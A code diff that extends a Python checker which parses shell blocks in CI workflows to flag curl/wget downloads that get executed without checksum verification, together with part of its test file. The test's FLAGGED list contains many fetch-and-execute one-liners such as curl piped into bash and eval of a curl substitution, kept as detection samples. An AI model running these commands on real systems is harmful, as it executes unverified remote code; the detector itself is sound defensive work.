 # Shells run their FIRST positional as a script and their stdin as code; the others need an explicit
 # code flag. A fetch substitution flags as executed only in a CODE position, never as a data arg to a
 # script (`python report.py "$(curl)"`), so the interpreter rule stays usable (cycle-13 R4).
 _SHELLS = frozenset({"bash", "sh", "dash", "zsh", "ksh", "ash"})
 _CODE_FLAGS = frozenset({"-c", "-e", "-E", "--command", "--eval"})  # operand is code, not a filename
 _CODE_FLAG_PREFIXES = ("-c", "-e", "-E", "--command=", "--eval=")  # a GLUED code operand: `-c"$(curl)"`
+_MAX_SHELL_DEPTH = 4  # recursion guard for `bash -c '… bash -c "…" …'` nesting (cycle-15)
 # Verifier commands (a verifier tool + its check/verify subcommand) are recognised as real command
 # nodes only, in `_is_verifier` — a checksum word in a comment/string is dropped by the lexer, so it
 # can no longer grant trust (closes cycle-12 C12-5).
 # A run key anywhere (block `run:`, quoted `"run":`, or flow `{…, run: …}`) → try structural YAML
 # extraction. Broad on purpose: a false trigger just enters the (robust) YAML path; the line fallback
 # below handles templated bodies.
 _RUN_KEY_RE = re.compile(r"""(?m)(?:^|[\s,{])['"]?run['"]?\s*:""")
 _RUN_LINE_RE = re.compile(r"^(?P<indent>\s*)-?\s*run\s*:\s*(?P<rest>.*)$")
 _SCALAR_RE = re.compile(r"^[|>][+-]?[0-9]*$")  # block-scalar indicator: |, >, |-, |2, >+2, … (C12-8)
 
 
 def _fold_logical_lines(text: str) -> list[str]:
     """Fold `\\`-newline continuations and split-pipe scalars into logical lines. Folding only JOINS,
     so it can add flags, never remove them (fail-closed safe). Used by the pip-pin scan only."""
     text = re.sub(r"\\\n[ \t]*", " ", text)
     text = re.sub(r"\|[ \t]*\n[ \t]*", "| ", text)
     text = re.sub(r"\n[ \t]*\|", " |", text)
     return text.splitlines()
 
 
 def _basename(token: str) -> str:
     return token.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
 
 
 def _collect_run_blocks(doc: object) -> list[str]:
     """Every ``run:`` scalar in a parsed-YAML workflow, found STRUCTURALLY (recurse dicts/lists). A
     real YAML parse normalises quoted keys (`"run":`), flow-mapping steps (`{run: …}`), and block
     scalars — so none can hide a `curl|bash` from the gate the way a line regex let them (cycle-13
     Group D)."""
     blocks: list[str] = []
     if isinstance(doc, dict):
         for key, value in doc.items():
             if isinstance(key, str) and key.strip() == "run" and isinstance(value, str):
                 blocks.append(value)
             else:
                 blocks.extend(_collect_run_blocks(value))
     elif isinstance(doc, list):
         for item in doc:
             blocks.extend(_collect_run_blocks(item))
     return blocks
 
 
 def _run_blocks(text: str) -> list[str]:
     """Extract shell ``run:`` block bodies so workflow METADATA is never analyzed as shell (C11-5).
 
     A real YAML parse finds every ``run:`` value structurally (quoted/flow keys, block scalars — closes
     cycle-13 Group D). Templated scaffold bodies (`{{ … }}`) are not valid YAML and fall back to the
     tolerant line extractor — which handles `run :` (space), block-scalar indicators (`|2`/`|-`/`>+`),
     and a trailing `# comment` (C12-8). Raw shell (no ``run:`` at all, e.g. a unit-test snippet) is
     returned whole."""
     if not _RUN_KEY_RE.search(text):
         return [text]
     try:
         import yaml
 
         doc = yaml.safe_load(text)
     except Exception:  # noqa: BLE001 — not valid YAML (templated scaffold) → line-extractor fallback
         doc = None
     if doc is not None and not isinstance(doc, str):
         blocks = _collect_run_blocks(doc)
         if blocks:
             return blocks
     # Fallback: tolerant line extractor (templated bodies, or a YAML doc with no run: scalar).
     lines = text.splitlines()
     blocks = []
     i = 0
     while i < len(lines):
         match = _RUN_LINE_RE.match(lines[i])
         if not match:
             i += 1
             continue
         rest = re.sub(r"\s+#.*$", "", match.group("rest")).strip()  # drop a trailing YAML comment
         if _SCALAR_RE.match(rest):
             base = len(match.group("indent"))
             body: list[str] = []
             i += 1
             while i < len(lines):
                 line = lines[i]
                 if line.strip() and (len(line) - len(line.lstrip())) <= base:
                     break  # dedent ends the block scalar
@@ -205,167 +206,199 @@ def _command_name(node: object) -> str | None:
         if getattr(part, "kind", None) == "word":
             return _basename(part.word)
     return None
 
 
 def _children(node: object) -> list[object]:
     """Every child AST node, regardless of the attribute that holds it. bashlex stores children under
     differently-named attrs (`parts`, `list`, `command`, `output`, `heredoc`, …) and some as Python
     lists (`CompoundNode.list`). A generic descent over all node-valued attrs is the ONLY way to reach
     compound/subshell/loop bodies and redirect-target substitutions — a named-attr probe silently skips
     them and the walk fails OPEN (cycle-13 Group A)."""
     children: list[object] = []
     for value in vars(node).values():
         if getattr(value, "kind", None):
             children.append(value)
         elif isinstance(value, (list, tuple)):
             children.extend(v for v in value if getattr(v, "kind", None))
     return children
 
 
 def _plain_words(node: object) -> list[str]:
     """The literal WORD tokens of a CommandNode (excludes assignments and redirect operators)."""
     return [p.word for p in getattr(node, "parts", []) if getattr(p, "kind", None) == "word"]
 
 
 def _resolved_program(node: object) -> str | None:
     """The basename of a CommandNode's real PROGRAM, peeling transparent wrappers and their operands so
     `sudo curl`/`env A=1 curl`/`timeout 5 curl` resolve to `curl`. Resolving by program POSITION (vs
     matching any word) keeps `sudo curl` a fetch while a literal `curl` ARGUMENT (`grep curl`) is not."""
     if getattr(node, "kind", None) != "command":
         return None
     words = _plain_words(node)
     i = 0
     while i < len(words):
         base = _basename(words[i])
         if base not in _WRAPPERS:
             return base
         i += 1
         while i < len(words) and words[i].startswith("-"):  # skip the wrapper's own flags
             i += 1
         if base == "env":  # env VAR=val … program
             while i < len(words) and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", words[i]):
                 i += 1
         elif base == "timeout" and i < len(words) and re.fullmatch(r"[0-9]+(\.[0-9]+)?[smhd]?", words[i]):
             i += 1  # timeout DURATION program
     return None
 
 
 def _is_introspection(node: object) -> bool:
     """`command -v X` / `type X` / `which X` look a program UP — they neither fetch nor execute it, so
     `command -v curl` must not read as a curl fetch (cycle-13 R4)."""
     words = _plain_words(node)
     if not words:
         return False
     prog = _basename(words[0])
     if prog == "command":
         return any(w in ("-v", "-V", "--version") for w in words)
     return prog in ("type", "which", "hash", "whereis")
 
 
 def _fetch_tool(node: object) -> str | None:
     """'curl'/'wget' if this CommandNode runs one (through wrappers, cycle-13 Group B)."""
     if _is_introspection(node):
         return None
     prog = _resolved_program(node)
     if prog in _FETCH_NAMES:
         return prog
     # A wrapper whose options take ARGUMENTS (`env -u X curl`, `sudo -u root curl`) can hide the program
     # from the position-based resolve. When the command STARTS with a wrapper, fall back to any
     # curl/wget word (fail-closed). `grep curl` has no wrapper, so it is unaffected (no false fetch).
     words = _plain_words(node)
     if words and _basename(words[0]) in _WRAPPERS:
         for word in words:
             if _basename(word) in _FETCH_NAMES:
                 return _basename(word)
     return None
 
 
 def _is_interpreter(node: object) -> bool:
     """True if the command runs an interpreter (`bash`/`sh`/`eval`/`source`/`.`/`python`/…) — a
-    substitution fed to one is EXECUTED, not merely captured as data. Matches ANY command word so a
-    wrapper with arg-taking options (`sudo -u root bash -c …`, `timeout -k 5s 30s bash -c …`) can't hide
-    the interpreter (cycle-13 R4); a bare interpreter token as data (`echo bash`) is a rare, harmless
-    over-flag, unlike a literal `curl` which is common as a grep target."""
+    substitution fed to one is EXECUTED, not merely captured as data. Resolves the PROGRAM through
+    wrappers, with a wrapper-present fallback to any interpreter word (mirrors `_fetch_tool`) so
+    `sudo -u root bash -c …`/`timeout -k 5s 30s bash -c …` are caught WITHOUT misreading a literal
+    interpreter token in an ordinary command's args (`grep bash -e …`) as an interpreter (cycle-15)."""
     if getattr(node, "kind", None) != "command":
         return False
-    return any(_basename(word) in _INTERPRETERS for word in _plain_words(node))
+    if _resolved_program(node) in _INTERPRETERS:
+        return True
+    words = _plain_words(node)
+    return bool(words) and _basename(words[0]) in _WRAPPERS and any(_basename(w) in _INTERPRETERS for w in words)
+
+
+def _is_shell(node: object) -> bool:
+    """True if the command runs a POSIX shell (`bash`/`sh`/…) — whose `-c` operand is itself shell, vs
+    `python`/`perl`/`ruby` whose `-c`/`-e` operand is that LANGUAGE's code (never re-parsed as shell)."""
+    if getattr(node, "kind", None) != "command":
+        return False
+    if _resolved_program(node) in _SHELLS:
+        return True
+    words = _plain_words(node)
+    return bool(words) and _basename(words[0]) in _WRAPPERS and any(_basename(w) in _SHELLS for w in words)
+
+
+def _static_code_operands(node: object) -> list[str]:
+    """The LITERAL (substitution-free) string operands of a shell's `-c`/`-e` flag. These are shell to be
+    recursively scanned (`bash -c 'curl | bash'`); an operand carrying a substitution is already handled
+    by `_interpreter_executes_fetch`, so it is skipped here to avoid double work."""
+    word_parts = [p for p in getattr(node, "parts", []) if getattr(p, "kind", None) == "word"]
+    operands: list[str] = []
+    for i, part in enumerate(word_parts):
+        if part.word in _CODE_FLAGS and i + 1 < len(word_parts):
+            nxt = word_parts[i + 1]
+            has_subst = any(
+                getattr(c, "kind", None) in ("commandsubstitution", "processsubstitution")
+                for c in getattr(nxt, "parts", [])
+            )
+            if not has_subst:
+                operands.append(nxt.word)
+    return operands
 
 
 def _subtree_has_fetch(node: object) -> bool:
     """True if any CommandNode anywhere in this node's subtree runs curl/wget — so a fetch hidden in a
     group/subshell pipeline element (`{ curl; } | bash`) is still seen as a source."""
     if _fetch_tool(node):
         return True
     return any(_subtree_has_fetch(child) for child in _children(node))
 
 
 def _is_pure_sink(node: object) -> bool:
     """A downstream pipeline element is "safe" only if its resolved program is a pure-sink (`env jq`
     counts). A compound / subshell / loop, or a wrapped non-sink (`sudo bash`), is an executor."""
     return getattr(node, "kind", None) == "command" and _resolved_program(node) in _PURE_SINKS
 
 
 def _word_has_fetch_subst(word: object) -> bool:
     """True if a WORD node carries a command/process substitution whose subtree runs curl/wget
     (`"$(curl)"`, `<(curl)`)."""
     return any(
         getattr(p, "kind", None) in ("commandsubstitution", "processsubstitution") and _subtree_has_fetch(p)
         for p in getattr(word, "parts", [])
     )
 
 
 def _command_position_fetch_subst(node: object) -> bool:
     """True if the command-position word is a fetch substitution (`$(curl …) arg` runs the fetched
     bytes as the command)."""
     for part in getattr(node, "parts", []):
         if getattr(part, "kind", None) == "word":
             return _word_has_fetch_subst(part)  # first word is the program position
         if getattr(part, "kind", None) == "assignment":
             continue
     return False
 
 
 def _interpreter_executes_fetch(node: object) -> bool:
     """True if a fetch substitution reaches an interpreter in a CODE position — the operand of `-c`/`-e`,
     an `eval`/`source` argument, a shell's first positional (`bash <(curl)`), or its stdin
     (`bash <<<"$(curl)"`, `bash < <(curl)`). A fetch passed as a DATA arg to a script
     (`python3 report.py "$(curl)"`) is not execution and is not flagged (cycle-13 R4)."""
     if not _is_interpreter(node) or _is_introspection(node):
         return False
     word_parts = [p for p in getattr(node, "parts", []) if getattr(p, "kind", None) == "word"]
     names = {_basename(p.word) for p in word_parts}
     # eval / source / . : every argument is code.
     if names & {"eval", "source", "."} and any(_word_has_fetch_subst(p) for p in word_parts):
         return True
     # a code flag carries the fetch — its SEPARATE operand (`-c "$(curl)"`) OR a GLUED operand
     # (`-c"$(curl)"`, which bashlex tokenises as one `-c$(…)` word; cycle-14 R3 fail-open).
     for i, part in enumerate(word_parts):
         if part.word in _CODE_FLAGS and i + 1 < len(word_parts) and _word_has_fetch_subst(word_parts[i + 1]):
             return True
         if part.word.startswith(_CODE_FLAG_PREFIXES) and _word_has_fetch_subst(part):
             return True
     # a shell runs its FIRST positional as a script (`bash <(curl)`); later words are its data args.
     if names & _SHELLS:
         for part in word_parts[1:]:
             if part.word.startswith("-"):
                 continue
             if _word_has_fetch_subst(part):
                 return True
             break
     # stdin fed to the interpreter is code (`bash <<<"$(curl)"`, `bash < <(curl)`, `xargs sh < <(curl)`).
     for part in getattr(node, "parts", []):
         if getattr(part, "kind", None) == "redirect" and getattr(part, "type", None) in ("<", "<<<"):
             out = getattr(part, "output", None)
             if out is not None and _word_has_fetch_subst(out):
                 return True
     return False
 
 
 def _redirects_to_interpreter_procsub(node: object) -> bool:
     """True if a `>`/`>>` redirect target of this command is a process substitution running an
     interpreter (`curl … > >(bash)`, `… | cat > >(bash)`) — the bytes are written into a shell."""
     for part in getattr(node, "parts", []):
         if getattr(part, "kind", None) == "redirect" and getattr(part, "type", None) in (">", ">>"):
             out = getattr(part, "output", None)
             for sub in getattr(out, "parts", []):
                 if getattr(sub, "kind", None) == "processsubstitution" and _is_interpreter(
@@ -399,277 +432,291 @@ def _is_verifier(node: object) -> bool:
         return any(w in ("verify", "verify-blob") for w in rest)
     if name == "gpg":
         return any(w in ("--verify", "--decrypt") for w in rest)
     if name == "minisign":
         return "-V" in rest
     return False
 
 
 def _fetch_output_files(node: object, tool: str) -> set[str]:
     """Files a curl/wget command writes (a later use of one is "used unverified fetched bytes").
 
     Parses the bounded, stable curl/wget output grammar — `-o`/`--output`(`=`)`, the curl `-O`/
     `--remote-name` and clustered/glued `-fsSLo FILE`/`-oFILE` forms, the wget `-O`/`-OFILE`/
     `--output-document` forms, `--output-dir`/`-P`/`--directory-prefix` path prefixes, the wget
     default-basename download, and any `>`/`>>` redirect target. Over-detecting a written file is
     fail-closed; under-detecting (cycle-13 Group C: `wget -O`, glued `-o`, `--output-dir`) is the bug
     this closes. Empty set ⇒ the fetch streams to stdout."""
     words = _plain_words(node)
     files: set[str] = set()
     files |= _redirect_files(node)
     urls = [w for w in words if "://" in w]
     out_dir: str | None = None
     i = 0
     while i < len(words):
         w = words[i]
         nxt = words[i + 1] if i + 1 < len(words) else None
         if w in ("--output-dir", "-P", "--directory-prefix") and nxt is not None:
             out_dir = nxt
             i += 2
             continue
         if w.startswith("--output-dir=") or w.startswith("--directory-prefix="):
             out_dir = w.split("=", 1)[1]
         elif w in ("-o", "--output") and nxt is not None:  # curl output; wget -o is a logfile → fail-closed
             files.add(nxt.lstrip("="))
             i += 2
             continue
         elif w.startswith("--output="):
             files.add(w.split("=", 1)[1])
         elif tool == "wget" and w in ("-O", "--output-document") and nxt is not None:
             if nxt != "-":
                 files.add(nxt.lstrip("="))
             i += 2
             continue
         elif tool == "wget" and w.startswith("--output-document="):
             val = w.split("=", 1)[1]
             if val != "-":
                 files.add(val)
         elif tool == "wget" and re.fullmatch(r"-O.+", w):  # glued wget -OFILE / -O=FILE
             val = w[2:].lstrip("=")
             if val != "-":
                 files.add(val)
         elif tool == "curl" and w in ("-O", "--remote-name", "--remote-name-all"):
             files.update(_basename(u) for u in urls)
         elif tool == "curl" and re.fullmatch(r"-[a-zA-Z]*o", w) and nxt is not None:  # cluster -…o FILE
             files.add(nxt.lstrip("="))
             i += 2
             continue
         elif tool == "curl" and not w.startswith("--") and re.fullmatch(r"-[a-zA-Z]*o=?.+", w):  # glued -oFILE
             files.add(re.sub(r"^-[a-zA-Z]*o=?", "", w))
         elif tool == "curl" and re.fullmatch(r"-[a-zA-Z]*O[a-zA-Z]*", w):  # cluster containing O
             files.update(_basename(u) for u in urls)
         i += 1
     # wget writes the remote basename by default unless it streams to stdout.
     if tool == "wget" and not files:
         streams = any(
             w in ("-O-", "-qO-", "--output-document=-") or (w in ("-O", "--output-document") and "-" in words)
             for w in words
         ) or any("/dev/stdout" in w for w in words)
         if not streams:
             files.update(_basename(u) for u in urls)
     if out_dir:  # a path prefix yields both the bare basename and the prefixed path
         prefix = out_dir.rstrip("/")
         files |= {f"{prefix}/{_basename(f)}" for f in list(files)}
         files |= {f"{prefix}/{_basename(u)}" for u in urls}
     return files
 
 
 class _FetchWalk:
     """Walks a bashlex AST collecting what's needed to decide §11.3 fetch-execute violations."""
 
-    def __init__(self) -> None:
+    def __init__(self, depth: int = 0) -> None:
         self.violations: list[str] = []
         self.downloads: set[str] = set()  # files holding unverified fetched bytes
         self.has_verifier: bool = False  # a real verify command anywhere in the block → downloads vetted
         self.used: set[str] = set()  # words used by non-fetch, non-verifier commands
+        self.depth: int = depth  # recursion depth into shell `-c` strings (cycle-15)
 
     def walk(self, node: object) -> None:
         kind = getattr(node, "kind", None)
         if kind == "pipeline":
             self._pipeline(node)
         elif kind == "command":
             self._command(node)
         # GENERIC descent — every child node, whatever attribute holds it (including the inner command
         # of a substitution, walked here so its own fetches are still collected). Never narrow this to
         # named attributes: that is exactly how cycle-13 Group A failed open (compound/subshell/loop
         # bodies and redirect-target substitutions were skipped). Whether a substitution EXECUTES is
         # decided by its enclosing command in `_command`, not by the bare fact of being a substitution.
         for child in _children(node):
             self.walk(child)
 
     def _pipeline(self, node: object) -> None:
         elements = [p for p in node.parts if getattr(p, "kind", None) != "pipe"]
         for idx, element in enumerate(elements):
             # (A) a fetch's bytes flow into a downstream element. Safe only if EVERY downstream element
             # is a pure-sink command — a stream cannot be checksum-verified mid-flight, so a verifier
             # elsewhere never excuses it (C12-1), and a compound / subshell / wrapped non-sink counts as
             # an executor (cycle-13 Group A/B).
             if _subtree_has_fetch(element) and any(not _is_pure_sink(d) for d in elements[idx + 1 :]):
                 self.violations.append("fetch piped into a non-data-sink command")
         if any(_subtree_has_fetch(e) for e in elements):
             for element in elements:
                 if getattr(element, "kind", None) != "command":
                     continue
                 if _redirects_to_interpreter_procsub(element):  # `curl | cat > >(bash)`
                     self.violations.append("fetch written into a process substitution running a shell")
                 # Files written ANYWHERE in a fetch-bearing pipeline (`curl | cat > f`) hold fetched bytes.
                 tool = _fetch_tool(element)
                 self.downloads |= _fetch_output_files(element, tool) if tool else _redirect_files(element)
 
     def _command(self, node: object) -> None:
         tool = _fetch_tool(node)
         if tool:
             if _redirects_to_interpreter_procsub(node):
                 # `curl … > >(bash)` — the fetch's bytes are written straight into a shell. Execution.
                 self.violations.append("fetch written into a process substitution running a shell")
             self.downloads |= _fetch_output_files(node, tool)
             return
         if _is_verifier(node):
             # A real verify COMMAND (not a comment/string — the lexer dropped those) vets the block's
             # DOWNLOADS. It does NOT vet a streamed fetch (handled above). Verify handling is deliberately
             # BLOCK-LEVEL, not order/gating/artifact aware — an order-aware attempt (cycle-13 R5) was
             # reverted (cycle-14 R1) because it false-positived every legitimate verified install whose
             # checksum names the artifact (`printf "%s  %s" "$SHA" tool | sha256sum -c -`) or whose setup
             # touches it (`chmod +x tool`) before the verifier ran. The cost: a verify that runs AFTER
             # the use, fails open (`|| true`), or covers a DIFFERENT artifact still vets — documented
             # out-of-scope for this honest-mistake gate (precise verify dataflow is the irreducible tail).
             self.has_verifier = True
             return
         # (B) a fetch substitution that is EXECUTED — run as the command (`$(curl) …`) or fed to an
         # interpreter (`bash -c "$(curl)"`, `bash <(curl)`, `bash <<<"$(curl)"`). A substitution merely
         # CAPTURED as data (`X=$(curl)`, `echo "$(curl)"`) is not flagged — that is what keeps the gate
         # usable on the dominant "fetch a value" pattern.
         if _command_position_fetch_subst(node):
             self.violations.append("fetch substitution run as a command")
         elif _interpreter_executes_fetch(node):
             self.violations.append("fetch substitution executed by an interpreter")
+        # cycle-15: a shell's static `-c`/`-e` STRING operand is itself shell — recursively scan it so
+        # `bash -c 'curl | bash'` (literal code, not a substitution) is not a fail-open. Depth-guarded.
+        if self.depth < _MAX_SHELL_DEPTH and _is_shell(node):
+            for operand in _static_code_operands(node):
+                for reason in _scan_block(operand, self.depth + 1):
+                    self.violations.append(f"shell -c string: {reason}")
         self.used |= set(_plain_words(node)) | _input_redirect_files(node)  # `bash < f` USES f
 
 
 def _redirect_files(node: object) -> set[str]:
     files: set[str] = set()
     for part in getattr(node, "parts", []):
         if getattr(part, "kind", None) == "redirect" and getattr(part, "type", None) in (">", ">>"):
             out = getattr(part, "output", None)
             if out is not None and getattr(out, "kind", None) == "word" and out.word != "/dev/null":
                 files.add(out.word)
     return files
 
 
 def _file_match(download: str, word: str) -> bool:
     """Whether a used `word` references a downloaded file. Normalises a leading `./` and matches on
     basename ONLY when one side carries no directory — so `./install.sh` matches a downloaded
     `install.sh`, but `/tmp/data.json` and `./fixtures/data.json` (different dirs) do NOT collide."""
     d = download[2:] if download.startswith("./") else download
     u = word[2:] if word.startswith("./") else word
     return d == u or ("/" not in d and _basename(u) == d) or ("/" not in u and _basename(d) == u)
 
 
+def _scan_block(block: str, depth: int = 0) -> list[str]:
+    """Parse one shell block and return its fetch-execute violation reasons. Recursive: a shell's static
+    `-c`/`-e` string operand IS more shell, so it is scanned at ``depth+1`` (cycle-15: `bash -c 'curl |
+    bash'` is a literal code string, not a substitution). A block that mentions curl/wget but bashlex
+    cannot parse fails CLOSED."""
+    import bashlex
+
+    if not _FETCH_RE.search(block):
+        return []
+    try:
+        trees = bashlex.parse(block)
+    except Exception:  # noqa: BLE001 — ANY parse failure (templated/garbled) → cannot prove safe
+        return [f"(unparsed block): {block.strip()[:80]}"]
+    walk = _FetchWalk(depth)
+    for tree in trees:
+        walk.walk(tree)
+    reasons = list(walk.violations)
+    # (C) a downloaded file used by a later command, with no verify command in the block. `./install.sh`
+    # matches a downloaded `install.sh`, but unrelated paths sharing a basename (`/tmp/data.json` vs
+    # `./fixtures/data.json`) do not collide.
+    if not walk.has_verifier:
+        unverified = sorted(d for d in walk.downloads if any(_file_match(d, word) for word in walk.used))
+        if unverified:
+            reasons.append(f"unverified downloaded file used: {unverified}")
+    return reasons
+
+
 def fetch_execute_violations(text: str) -> list[str]:
     """Fail-closed §11.3 fetch-execute check over a real shell AST (design contract above).
 
     For each ``run:`` block: parse it with bashlex and walk the AST. A `curl`/`wget` is flagged when
     its output reaches execution (non-sink pipe / executed substitution / a downloaded file used
-    unverified). A block bashlex cannot parse but that mentions curl/wget fails CLOSED (flagged)."""
-    import bashlex
-
+    unverified / a shell `-c` string that itself fetch-executes)."""
     violations: list[str] = []
     for block in _run_blocks(text):
-        if not _FETCH_RE.search(block):
-            continue
-        try:
-            trees = bashlex.parse(block)
-        except Exception:  # noqa: BLE001 — ANY parse failure (templated/garbled) → cannot prove safe
-            # Unparseable but it mentions curl/wget → fail closed.
-            violations.append(f"fetch-and-execute without checksum (unparsed block): {block.strip()[:80]}")
-            continue
-        walk = _FetchWalk()
-        for tree in trees:
-            walk.walk(tree)
-        reasons = list(walk.violations)
-        # (C) a downloaded file used by a later command, with no verify command in the block. `./install.sh`
-        # matches a downloaded `install.sh`, but unrelated paths sharing a basename (`/tmp/data.json` vs
-        # `./fixtures/data.json`) do not collide.
-        if not walk.has_verifier:
-            unverified = sorted(d for d in walk.downloads if any(_file_match(d, word) for word in walk.used))
-            if unverified:
-                reasons.append(f"unverified downloaded file used: {unverified}")
+        reasons = _scan_block(block, 0)
         if reasons:
             violations.append(f"fetch-and-execute without checksum: {reasons[0]}")
     return violations
 
 
 # §11.3: a tool installed from a package index that exposes no digest (a pip package)
 # must be pinned to an EXACT version, never a floating latest. Match a `pip install`
 # invocation and inspect the package tokens after it.
 _PIP_INSTALL_RE = re.compile(r"\bpip[0-9]*\s+install\b(?P<rest>[^\n]*)")
 # The package-name portion of a pip token (optionally with an extras spec), e.g. `build`,
 # `pydoc-markdown`, `pkg[extra]`. Used after stripping any version specifier to identify a
 # real index package (vs a path/URL/var) so a NON-exact spec can still be reported by name.
 _PIP_PKG_RE = re.compile(r"^[A-Za-z][A-Za-z0-9._-]*(?:\[[A-Za-z0-9_,.-]+\])?$")
 # Any PEP 440 version operator; used to split a token into its name and to detect a spec.
 _PIP_VERSION_OP_RE = re.compile(r"(===|==|>=|<=|~=|!=|<|>)")
 
 
 def _unpinned_pip_packages(rest: str) -> list[str]:
     """PyPI package tokens in a `pip install` arg list that are NOT pinned to an exact version.
 
     §11.3 requires an **exact** version (`name==X.Y.Z`), never a floating latest. So a bare
     name (`build`) AND a non-exact specifier (`foo>=1.0`, `foo~=1.0`, the wildcard `foo==1.*`)
     are all flagged; only a concrete `==`/`===` pin with no wildcard is accepted. Excludes
     things that are not a plain index package: option flags, the local project
     (`.`/`.[extra]`/`-e <path>`), requirements/constraints files, VCS (`git+…`), built wheels
     (`*.whl`), URLs, and shell-variable tokens (`${…}`) — conservative, so a legitimate
     local/VCS install never trips it.
 
     PEP 508 **environment markers** (``foo==1.0; python_version<'3.9'``) and **direct
     references** (``foo @ git+…``) are NOT flagged: the marker fragment (a quote-bearing token)
     is ignored, and a name immediately followed by ``@`` is a direct reference, not a floating
     index package — both would otherwise be false positives.
 
     R8-12-PIP-WHITESPACE: PEP 440 §VersionSpecifiers permits whitespace around the operator
     (``foo == 1.2.3`` is a valid exact pin), but a plain ``rest.split()`` would emit three tokens
     `['foo', '==', '1.2.3']` and the bare `foo` would be wrongly flagged as floating. Collapse the
     whitespace around any PEP 440 operator into the canonical no-space form before tokenizing.
     """
     rest = re.sub(r"\s*(===|==|>=|<=|~=|!=|<|>)\s*", r"\1", rest)
     tokens = rest.split()
     flagged: list[str] = []
     skip_next = False
     for index, token in enumerate(tokens):
         if skip_next:
             skip_next = False
             continue
         stripped = token.strip("'\"")
         if stripped in ("-r", "--requirement", "-c", "--constraint"):
             skip_next = True  # the following token is a file path, not a package
             continue
         if stripped.startswith("-"):  # any other flag (-e, --quiet, --upgrade, …)
             continue
         # Drop any PEP 508 environment marker BEFORE evaluating — the spec is everything before
         # the `;`. This handles both the spaced (`foo>=1.0; python_version<'3.9'`, marker is a
         # separate token) and GLUED (`foo>=1.0;python_version<'3.9'`, one token) forms, so a
         # genuinely floating spec glued to a marker is not silently dropped by the quote-skip.
         spec = stripped.split(";", 1)[0].strip().strip("'\"")
         # A marker fragment (the part after `;`, surfacing as its own token in the spaced form)
         # carries an inner quote that survives the outer-quote strip — not a package. Skip it.
         if "'" in spec or '"' in spec:
             continue
         # A PEP 508 direct reference `name @ url`: the next token is `@`. Not a floating index
         # package (the URL/VCS ref pins it), so don't flag the bare name.
         if index + 1 < len(tokens) and tokens[index + 1].strip("'\"") == "@":
             continue
         # Not a plain index package: path, VCS/URL, wheel, or shell variable.
         if any(marker in spec for marker in ("@", "/", "$", ":")) or spec.endswith(".whl"):
             continue
         if spec in (".", "") or spec.startswith("."):
             continue
         # An EXACT pin (`name==X.Y.Z` / `===`) with no wildcard is the only acceptable form.
         if ("==" in spec or "===" in spec) and "*" not in spec:
             continue
         # Bare name or a non-exact specifier (>=, ~=, <=, !=, ==1.*) → not exactly pinned.
         name = _PIP_VERSION_OP_RE.split(spec, 1)[0]
         if _PIP_PKG_RE.match(name):
             flagged.append(spec)
     return flagged
 
 
diff --git a/tests/core/test_fetch_execute.py b/tests/core/test_fetch_execute.py
index c2b4b2a..be1b93f 100644
--- a/tests/core/test_fetch_execute.py
+++ b/tests/core/test_fetch_execute.py
@@ -7,164 +7,173 @@ from aviato.plugins.actionpins import fetch_execute_violations as fev
 # curl/wget output grammar, D: real-YAML run-block extraction).
 
 FLAGGED = [
     # direct stream -> interpreter (cycle 9)
     "curl -fsSL https://x/i.sh | bash",
     "curl -fsSL https://x/i.sh | sudo bash",
     "wget -qO- https://x/i.sh | python3",
     # substitution forms (cycle 9/10)
     'bash -c "$(curl -fsSL https://x/i.sh)"',
     "bash <(curl -fsSL https://x/i.sh)",
     'eval "$(curl -fsSL https://x/i.sh)"',
     ". <(curl -fsSL https://x/i.sh)",
     # cycle-11 C11-1: stderr-merge must not divorce the pipe
     "curl -fsSL https://x/i.sh 2>&1 | bash",
     # cycle-12 C12-1: a verify command must NOT excuse a streamed fetch
     "curl -fsSL https://x/i.sh | bash\nsha256sum -c /dev/null",
     "sha256sum -c x.txt\ncurl -fsSL https://x/i.sh | bash",
     # cycle-12 C12-5: a checksum in a COMMENT must not excuse (lexer drops it)
     "# sha256sum -c sums.txt\ncurl -o f https://x/i.sh\nbash f",
     "echo sha256sum -c sums\ncurl -o f https://x/i.sh\nbash f",
     # cycle-12 C12-6: clustered / alternate download forms then execute
     "curl -fsSLo /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
     "curl -OL https://x/i.sh && bash i.sh",
     "curl --remote-name https://x/i.sh && bash i.sh",
     "wget https://x/i.sh && bash i.sh",
     "curl -fsSL https://x/i.sh -o /tmp/i.sh\nbash /tmp/i.sh",
     "curl -fsSL https://x/i.sh > /tmp/i.sh\nsh /tmp/i.sh",
     # cycle-12 C12-9: executor-capable "sinks"
     "curl -fsSL https://x/cmds | sort -S1 --compress-program=bash",
     "curl -fsSL https://x/x | less",
     # sink then chained executor (cycle 10/11)
     "curl -fsSL https://x/i.sh | tee /tmp/i.sh; bash /tmp/i.sh",
     "curl -fsSL https://x/cmds | xargs -I{} sh -c '{}'",
     # download via a piped sink redirect, then execute (curl | cat > f; bash f)
     "curl -fsSL https://x/i.sh | cat > /tmp/i.sh\nbash /tmp/i.sh",
     # --- cycle-13 Group A: compound / subshell / loop bodies + redirect-target substitutions ---
     # (the first bashlex walk descended only named attrs, so these whole subtrees were invisible)
     "curl -fsSL https://x/i.sh | { bash; }",
     "curl -fsSL https://x/i.sh | ( bash )",
     "curl -fsSL https://x/cmds | while read l; do $l; done",
     "{ curl -fsSL https://x/i.sh | bash; }",
     "( curl -fsSL https://x/i.sh | bash )",
     "( curl -fsSL https://x/i.sh -o f ); bash f",
     "{ curl -fsSL https://x/i.sh; } | bash",
     "( curl -fsSL https://x/i.sh ) | bash",
     "if true; then curl -fsSL https://x/i.sh; fi | bash",
     "while true; do curl -fsSL https://x/i.sh; break; done | bash",
     "for x in 1; do curl -fsSL https://x/i.sh; done | bash",
     'bash <<< "$(curl -fsSL https://x/i.sh)"',
     "bash < <(curl -fsSL https://x/i.sh)",
     "sh -s < <(curl -fsSL https://x/i.sh)",
     "source < <(curl -fsSL https://x/i.sh)",
     "curl -fsSL https://x/i.sh > >(bash)",
     # --- cycle-13 Group B: transparent command wrappers must not hide the fetch ---
     "sudo curl -fsSL https://x/i.sh | bash",
     "env curl -fsSL https://x/i.sh | bash",
     "command curl -fsSL https://x/i.sh | bash",
     # --- cycle-13 Group C: output forms the option parser missed ---
     "wget -O /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
     "wget -O/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
